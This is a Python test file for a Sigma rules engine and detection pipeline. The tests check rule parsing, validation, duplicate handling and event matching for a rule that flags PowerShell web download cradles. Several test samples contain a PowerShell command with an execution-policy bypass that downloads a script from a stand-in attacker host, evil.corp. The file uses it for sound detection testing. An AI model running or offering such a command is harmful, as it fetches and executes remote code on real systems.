"""Unit and integration tests for Sigma Rules Engine and Unified Detection Pipeline."""

from __future__ import annotations

import copy
import json
import shutil
import tempfile
import unittest
from pathlib import Path

from logscope.canonical import CanonicalEvent, ConclusionLevel
from platform_core.detection_engine import (
    ConditionEvaluator,
    DetectionEngine,
    DetectionRule,
    get_detection_engine,
)
from platform_core.sigma_engine import (
    MinimalYamlParser,
    MultiStageSigmaParser,
    SigmaCompatibilityAnalyzer,
    SigmaConditionAST,
    SigmaEngine,
    SigmaRuleAdapter,
    SigmaValidator,
)


SAMPLE_SIGMA_RULE = """
title: Suspicious PowerShell Web Download Cradle
id: 3b6ab547-8ec2-4991-bc65-0a4c152b08ca
status: test
description: Detects suspicious PowerShell web download cradles.
author: SOC Detection Engineering
date: 2024/01/15
modified: 2026/01/10
license: Apache-2.0
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        CommandLine|contains:
            - "DownloadString"
            - "DownloadFile"
            - "Invoke-WebRequest"
    selection_img:
        Image|endswith:
            - "\\powershell.exe"
            - "\\pwsh.exe"
    filter_admin:
        User: "SYSTEM"
    condition: (selection_cmd and selection_img) and not filter_admin
falsepositives:
    - Administrative automation scripts
level: high
test_samples:
    positive:
        - Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
          CommandLine: "powershell.exe -ep bypass (New-Object Net.WebClient).DownloadString('http://evil.corp/p.ps1')"
          User: "attacker"
    negative:
        - Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
          CommandLine: "powershell.exe Get-Process"
          User: "SYSTEM"
"""

SAMPLE_PARTIAL_SIGMA_RULE = """
title: Suspicious Generic Execution
id: 99999999-aaaa-bbbb-cccc-111111111111
status: experimental
description: Rule containing both canonical and unknown telemetry fields.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: "\\cmd.exe"
        UnknownFieldXYZ: "malicious"
        SubStatus: "0xc000006a"
    condition: selection
level: medium
"""


class SigmaEngineTests(unittest.TestCase):

    def setUp(self):
        self.tmp_dir = Path(tempfile.mkdtemp())
        self.sigma_engine = SigmaEngine(workspace_root=self.tmp_dir)

    def tearDown(self):
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    # 1. Multi-Stage Parser Tests
    def test_minimal_yaml_parser(self):
        parsed = MinimalYamlParser.parse(SAMPLE_SIGMA_RULE)
        self.assertIsInstance(parsed, dict)
        self.assertEqual(parsed.get("id"), "3b6ab547-8ec2-4991-bc65-0a4c152b08ca")
        self.assertEqual(parsed.get("status"), "test")
        self.assertIn("detection", parsed)
        self.assertIn("selection_cmd", parsed["detection"])

    def test_multistage_parser_yaml_and_json_fallback(self):
        # 1. YAML string
        parsed_yaml, stage = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        self.assertEqual(parsed_yaml.get("id"), "3b6ab547-8ec2-4991-bc65-0a4c152b08ca")
        self.assertIn(stage, ["pyyaml", "minimal_yaml"])

        # 2. JSON Fallback
        json_content = json.dumps({
            "title": "JSON Sigma Rule",
            "id": "json-123",
            "logsource": {"category": "test"},
            "detection": {"condition": "1 of them"}
        })
        parsed_json, stage_json = MultiStageSigmaParser.parse_text(json_content)
        self.assertEqual(parsed_json.get("id"), "json-123")
        self.assertIn(stage_json, ["json", "json_fallback"])

    # 2. Validation Tests
    def test_sigma_validator(self):
        # Valid rule
        parsed, _ = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        val = SigmaValidator.validate(parsed)
        self.assertTrue(val["valid"])

        # Missing required fields
        invalid_rule = {"title": "Missing ID and Condition"}
        val_inv = SigmaValidator.validate(invalid_rule)
        self.assertFalse(val_inv["valid"])
        self.assertGreaterEqual(len(val_inv["errors"]), 2)

    # 3. Compatibility Layer Tests
    def test_compatibility_analyzer(self):
        parsed_full, _ = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        report_full = SigmaCompatibilityAnalyzer.analyze(parsed_full)
        self.assertEqual(report_full.status, "fully_compatible")
        self.assertEqual(report_full.score, 100)
        self.assertEqual(len(report_full.unsupported_fields), 0)

        # Partial rule with unknown/unsupported field
        parsed_partial, _ = MultiStageSigmaParser.parse_text(SAMPLE_PARTIAL_SIGMA_RULE)
        report_partial = SigmaCompatibilityAnalyzer.analyze(parsed_partial)
        self.assertEqual(report_partial.status, "unsupported_fields")
        self.assertLess(report_partial.score, 100)
        self.assertTrue(any(f["sigma_field"].lower() == "unknownfieldxyz" for f in report_partial.unsupported_fields))

    # 4. AST Condition Compilation Tests
    def test_condition_ast_compilation(self):
        detection = {
            "selection_proc": {
                "Image|endswith": ["\\powershell.exe", "\\pwsh.exe"],
                "CommandLine|contains": "-enc",
            },
            "filter_admin": {
                "User": "SYSTEM"
            },
            "condition": "selection_proc and not filter_admin"
        }
        cond_tree = SigmaConditionAST.compile_condition(detection["condition"], detection)
        self.assertIn("and", cond_tree)
        clauses = cond_tree["and"]
        self.assertEqual(len(clauses), 2)
        self.assertIn("not", clauses[1])

    # 5. In-Memory Adapter Pattern Tests
    def test_rule_adapter_no_duplicate_files(self):
        parsed, _ = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        adapter = SigmaRuleAdapter.to_detection_rule(parsed, source_type="builtin")

        self.assertEqual(adapter.id, "SIGMA-3B6AB547-8EC2-4991-BC65-0A4C152B08CA")
        self.assertEqual(adapter.severity, "high")
        self.assertEqual(adapter.lifecycle, "testing")
        self.assertEqual(adapter.source_format, "sigma")
        self.assertEqual(adapter.compatibility_score, 100)
        self.assertIn("Execution", adapter.mitre_attack["tactics"])
        self.assertIn("T1059.001", adapter.mitre_attack["techniques"])

        # Serialization to dict preserves sigma fields
        d = adapter.to_dict()
        self.assertEqual(d["source_format"], "sigma")
        self.assertEqual(d["sigma_id"], "3b6ab547-8ec2-4991-bc65-0a4c152b08ca")

    # 6. Duplicate Detection & Import Limits
    def test_duplicate_detection(self):
        # 1. Import rule once
        res = self.sigma_engine.import_rule(SAMPLE_SIGMA_RULE, force=False)
        self.assertTrue(res["success"])
        rule_id = res["id"]

        # 2. Duplicate by ID
        parsed, _ = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        dup_by_id = self.sigma_engine.check_duplicate(parsed, SAMPLE_SIGMA_RULE)
        self.assertTrue(dup_by_id["is_duplicate"])
        self.assertEqual(dup_by_id["match_type"], "id")

        # 3. Duplicate by Hash (different id, same content)
        different_id_data = copy.deepcopy(parsed)
        different_id_data["id"] = "different-uuid-12345"
        dup_by_hash = self.sigma_engine.check_duplicate(different_id_data, SAMPLE_SIGMA_RULE)
        self.assertTrue(dup_by_hash["is_duplicate"])
        self.assertEqual(dup_by_hash["match_type"], "hash")

        # 4. Attempting re-import without force returns is_duplicate=True
        dup_res = self.sigma_engine.import_rule(SAMPLE_SIGMA_RULE, force=False)
        self.assertFalse(dup_res["success"])
        self.assertTrue(dup_res["is_duplicate"])

        # 5. Re-import with force=True succeeds
        re_imported = self.sigma_engine.import_rule(SAMPLE_SIGMA_RULE, force=True)
        self.assertTrue(re_imported["success"])

    def test_import_size_limit(self):
        # Rule exceeding 5MB limit
        huge_rule = "A" * (6 * 1024 * 1024)
        with self.assertRaises(ValueError) as ctx:
            self.sigma_engine.import_rule(huge_rule)
        self.assertIn("5 ميجابايت", str(ctx.exception))

    # 7. Regression Test Corpus on Builtin Rules
    def test_builtin_rules_test_corpus(self):
        root_dir = Path(__file__).resolve().parent.parent
        engine = SigmaEngine(workspace_root=root_dir)
        builtins = engine.get_builtin_rules()
        self.assertGreaterEqual(len(builtins), 4)

        for rule in builtins:
            result = engine.run_tests(rule["id"])
            self.assertTrue(
                result["passed"],
                f"Rule {rule['id']} regression test failed: {result['positive']['passed']}/{result['positive']['total']} pos, {result['negative']['passed']}/{result['negative']['total']} neg."
            )

    # 8. Deletion Protection (Builtin vs Custom)
    def test_deletion_protection(self):
        # 1. Custom rule can be deleted
        res = self.sigma_engine.import_rule(SAMPLE_SIGMA_RULE, force=True)
        rule_id = res["id"]
        deleted = self.sigma_engine.delete_custom_rule(rule_id)
        self.assertTrue(deleted)

        # 2. Built-in rule cannot be deleted
        root_dir = Path(__file__).resolve().parent.parent
        real_engine = SigmaEngine(workspace_root=root_dir)
        builtins = real_engine.get_builtin_rules()
        if builtins:
            with self.assertRaises(PermissionError):
                real_engine.delete_custom_rule(builtins[0]["id"])

    # 9. DetectionEngine Integration & Event Evaluation
    def test_detection_engine_evaluates_sigma_rule(self):
        engine = DetectionEngine(detections_dir=self.tmp_dir / "detections")
        
        # Register Sigma adapter into engine
        parsed, _ = MultiStageSigmaParser.parse_text(SAMPLE_SIGMA_RULE)
        adapter = SigmaRuleAdapter.to_detection_rule(parsed, source_type="builtin")
        adapter.lifecycle = "production"
        engine._rules[adapter.id] = adapter

        # Positive event
        mal_evt = CanonicalEvent(
            event_id="1",
            username="attacker",
            source_ip="10.0.0.5",
            message="PowerShell download cradle invoked",
            raw_fields={
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -ep bypass (New-Object Net.WebClient).DownloadString('http://evil.corp/payload.ps1')"
            }
        )

        findings = engine.evaluate_event(mal_evt)
        matching_findings = [f for f in findings if f.detection_id == adapter.id]
        self.assertEqual(len(matching_findings), 1)
        finding = matching_findings[0]
        self.assertEqual(finding.base_severity, 75)
        self.assertEqual(finding.conclusion_level, ConclusionLevel.SUSPICIOUS)
        self.assertIn("T1059.001", finding.mitre_techniques)

        # Negative event (filtered out by SYSTEM user)
        benign_evt = CanonicalEvent(
            event_id="1",
            username="SYSTEM",
            source_ip="10.0.0.5",
            message="Legit PowerShell",
            raw_fields={
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -ep bypass (New-Object Net.WebClient).DownloadString('http://evil.corp/payload.ps1')",
                "User": "SYSTEM"
            }
        )
        benign_findings = engine.evaluate_event(benign_evt)
        self.assertEqual(len([f for f in benign_findings if f.detection_id == adapter.id]), 0)


if __name__ == "__main__":
    unittest.main()
